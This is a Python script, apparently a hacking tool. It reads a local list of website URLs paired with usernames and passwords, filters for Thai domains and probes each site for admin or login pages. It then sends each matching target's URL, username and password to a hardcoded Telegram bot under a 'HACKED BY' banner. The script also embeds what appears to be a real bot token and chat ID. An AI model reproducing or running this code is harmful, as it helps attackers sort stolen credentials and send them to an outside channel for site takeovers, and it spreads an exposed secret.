import requests
import datetime
import os
import time
import re

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = '7985076435:AAFzZHacgWBfk2DjzGO3BnFWpT6LYTZ874A'
TELEGRAM_CHAT_ID = '6837307356'

# File path
FILE_PATH = '/storage/emulated/0/Download/th.txt'

def send_to_telegram(message):
    """Send message to Telegram bot"""
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        response = requests.post(url, data=data)
        return response.json()
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        return None

def is_thai_website(url):
    """Check if website is Thai based on domain"""
    thai_domains = ['.th', '.co.th', '.ac.th', '.go.th', '.or.th', '.in.th']
    
    # Check domain
    if any(domain in url.lower() for domain in thai_domains):
        return True
    
    return False

def has_admin_login_page(url):
    """Check if website has admin or login pages"""
    admin_login_paths = [
        '/admin', '/login', '/administrator', '/wp-admin', '/admin.php',
        '/admin/', '/login.php', '/signin', '/auth', '/panel',
        '/dashboard', '/controlpanel', '/manager', '/webadmin'
    ]
    
    try:
        # Check common admin/login paths
        for path in admin_login_paths:
            test_url = f"{url.rstrip('/')}{path}"
            try:
                response = requests.get(test_url, timeout=5, allow_redirects=True)
                if response.status_code == 200:
                    # Check if page contains login-related elements
                    content_lower = response.text.lower()
                    if any(keyword in content_lower for keyword in ['login', 'sign in', 'username', 'password', 'admin', 'administrator']):
                        return True, test_url
            except:
                continue
        
        # Also check the main page for login forms
        try:
            response = requests.get(url, timeout=5)
            content_lower = response.text.lower()
            login_indicators = ['<form', 'password', 'username', 'login', 'sign in']
            if all(indicator in content_lower for indicator in ['<form', 'password']):
                return True, url
        except:
            pass
            
    except Exception as e:
        print(f"Error checking admin pages: {e}")
    
    return False, None

def parse_website_data(website_line):
    """Parse website line to extract URL, username and password"""
    try:
        # Remove any protocol prefix if exists
        clean_line = website_line.replace('http://', '').replace('https://', '')
        
        # Split by the first colon to separate URL and credentials
        if '/' in clean_line and ':' in clean_line:
            # Find the position where credentials start (after the last slash and before colon)
            parts = clean_line.split('/')
            url_part = parts[0]
            path_and_creds = '/'.join(parts[1:])
            
            # Now split the credentials part
            if ':' in path_and_creds:
                path_parts = path_and_creds.split(':')
                if len(path_parts) >= 3:
                    # URL is everything before the last colon in the path
                    url = f"http://{url_part}/{path_parts[0]}"
                    username = path_parts[1]
                    password = ':'.join(path_parts[2:])
                    return url, username, password
        
        # Alternative parsing for different formats
        if ':' in clean_line and '@' in clean_line:
            parts = clean_line.split(':')
            if len(parts) >= 3:
                url = f"http://{parts[0]}"
                username = parts[1]
                password = ':'.join(parts[2:])
                return url, username, password
        
        # Default return if parsing fails
        return f"http://{clean_line}", "", ""
    
    except Exception as e:
        print(f"Error parsing website data: {e}")
        return website_line, "", ""

def create_message(url, username, password):
    """Create formatted message with emojis"""
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    message = f"""
💀 <b>LOGIN SUCCESS!</b> 💀

🌐 <b>Target:</b> <code>{url}</code>
👤 <b>Username:</b> <code>{username}</code>
🔑 <b>Password:</b> <code>{password}</code>

 <b>HACKED BY NOTCTBER</b> 

⏰ <b>Time:</b> {current_time}
👥 <b>By:</b> @notctber | @NOTFOUNDCyber1
    """.strip()
    
    return message

def monitor_file_changes():
    """Monitor for new Thai websites with admin/login pages"""
    if not os.path.exists(FILE_PATH):
        print("File not found!")
        return
    
    # Track already processed websites
    processed_websites = set()
    
    while True:
        try:
            with open(FILE_PATH, 'r', encoding='utf-8', errors='ignore') as file:
                current_websites = set(line.strip() for line in file if line.strip())
            
            # Find new websites
            new_websites = current_websites - processed_websites
            
            for website_line in new_websites:
                if is_thai_website(website_line):
                    # Parse the website line to extract components
                    url, username, password = parse_website_data(website_line)
                    
                    # Check if website has admin/login pages
                    has_admin, admin_url = has_admin_login_page(url)
                    
                    if has_admin:
                        # Create the message with emojis
                        message = create_message(admin_url, username, password)
                        
                        # Send to Telegram
                        result = send_to_telegram(message)
                        if result and result.get('ok'):
                            processed_websites.add(website_line)
                            print(f"✅ Sent Thai admin website to Telegram: {admin_url}")
                        else:
                            print(f"❌ Failed to send: {website_line}")
                    else:
                        print(f"ℹ️ Thai website found but no admin/login page: {url}")
            
            # Wait for 20 seconds before next check
            print("⏳ Waiting 20 seconds before next check...")
            time.sleep(20)
            
        except Exception as e:
            print(f"🚨 Error monitoring file: {e}")
            time.sleep(20)

def scan_existing_websites():
    """Scan all existing websites in file for admin/login pages"""
    if not os.path.exists(FILE_PATH):
        print("❌ File not found!")
        return
    
    with open(FILE_PATH, 'r', encoding='utf-8', errors='ignore') as file:
        websites = [line.strip() for line in file if line.strip()]
    
    print(f"🔍 Scanning {len(websites)} websites for admin/login pages...")
    
    for website_line in websites:
        if is_thai_website(website_line):
            url, username, password = parse_website_data(website_line)
            has_admin, admin_url = has_admin_login_page(url)
            
            if has_admin:
                message = create_message(admin_url, username, password)
                
                result = send_to_telegram(message)
                if result and result.get('ok'):
                    print(f"✅ Sent Thai admin website: {admin_url}")
                else:
                    print(f"❌ Failed to send: {website_line}")
                
                # Wait 20 seconds between sends
                print("⏳ Waiting 20 seconds before next send...")
                time.sleep(20)

if __name__ == "__main__":
    # Replace these with your actual credentials
    TELEGRAM_BOT_TOKEN = "7985076435:AAFzZHacgWBfk2DjzGO3BnFWpT6LYTZ874A"
    TELEGRAM_CHAT_ID = "6837307356"
    
    print("🚀 Starting Thai website monitoring...")
    print("🤖 Bot will check for Thai websites with admin/login pages every 20 seconds")
    
    # Choose one of the following:
    
    # Option 1: Monitor for new websites only
    monitor_file_changes()
    
    # Option 2: Scan all existing websites once
    # scan_existing_websites()